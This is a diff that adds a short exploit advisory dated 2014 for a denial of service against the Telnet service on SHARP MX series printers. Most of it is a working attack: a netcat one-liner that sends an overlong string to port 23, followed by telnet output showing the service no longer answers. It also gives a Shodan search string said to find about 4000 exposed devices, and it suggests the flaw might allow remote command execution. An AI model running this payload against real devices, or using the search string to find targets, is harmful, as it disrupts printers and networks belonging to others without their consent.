@@ -1,0 +1,19 @@
+# Exploit Title: SHARP MX Series - Denial Of Service
+# Date: 08/08/2014
+# Exploit Author: pws
+# Vendor Homepage: Sharp Printers
+# Firmware Link: Not found
+# Tested on: Latest version
+# Shodan d0rk: "SHARP Telnet server" ~4000 devices
+# CVE : None yet
+
+$ python -c 'print "A"*200 + "\n"' | nc 192.168.30.5 23
+
+$ telnet 192.168.30.5 23
+Trying 192.168.30.5 23...
+telnet: Unable to connect to remote host: Connection refused
+
+This vulnerability leads to a Denial of Service vulnerability. 
+
+Unfortunately, we were unable to retrieve the core dumped but 
+this flaw might result in a Buffer Overflow allowing remote command execution.
